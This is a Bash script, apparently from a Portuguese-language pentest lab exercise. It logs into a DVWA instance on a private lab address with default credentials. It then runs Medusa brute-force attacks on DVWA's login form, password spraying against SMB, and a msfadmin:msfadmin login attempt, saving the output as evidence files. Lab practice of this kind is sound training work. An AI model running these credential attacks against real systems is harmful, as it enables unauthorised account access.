#!/bin/bash
# Correcoes da sufte completa
set +e
D=/home/kali/desafio
E=$D/evidencias
W=$D/wordlists

# Sessao autenticada no DVWA para acessar a pagina de Brute Force
curl -s -c /tmp/dvwa_suite -o /dev/null \
  -d 'username=admin&password=password&Login=Login' \
  http://192.168.56.101/dvwa/login.php
SID=$(awk '/PHPSESSID/{print $7}' /tmp/dvwa_suite)

{
  echo "=== CT-08 (corrigido): Medusa web-form no Brute Force do DVWA ==="
  echo "Alvo: /dvwa/vulnerabilities/brute/ (responde HTTP 200)"
  echo "DENY-SIGNAL: Username and/or password incorrect."
  echo "Sessao: PHPSESSID=$SID; security=low"
  echo "CMD: medusa -M web-form -m FORM:/dvwa/vulnerabilities/brute/ -m DENY-SIGNAL:'Username and/or password incorrect.'"
  echo
  medusa -h 192.168.56.101 \
    -U "$W/users.txt" -P "$W/passwords.txt" \
    -M web-form \
    -m FORM:"/dvwa/vulnerabilities/brute/" \
    -m DENY-SIGNAL:"Username and/or password incorrect." \
    -m FORM-DATA:"get?username=&USERNAME&password=&PASSWORD&Login=Login" \
    -m CUSTOM-HEADER:"Cookie: PHPSESSID=$SID; security=low" \
    -t 4
} 2>&1 | tee "$E/06-medusa-webform.txt"

{
  echo "=== CT-10 (corrigido): password spraying SMB com modulo smbnt ==="
  echo "CMD: medusa -M smbnt -U users-enum.txt -P spray.txt -t 3"
  echo
  medusa -h 192.168.56.101 \
    -U "$W/users-enum.txt" -P "$W/spray.txt" \
    -M smbnt -t 3
} 2>&1 | tee "$E/07-medusa-smb-spray.txt"

{
  echo "=== CT-10b: forca bruta SMB com msfadmin:msfadmin ==="
  printf 'msfadmin\n' > /tmp/smb_user.txt
  printf 'msfadmin\n' > /tmp/smb_pass.txt
  medusa -h 192.168.56.101 -U /tmp/smb_user.txt -P /tmp/smb_pass.txt -M smbnt -t 2
} 2>&1 | tee "$E/07-medusa-smb-msfadmin.txt"

echo "=== FIM DAS CORRECOES ==="
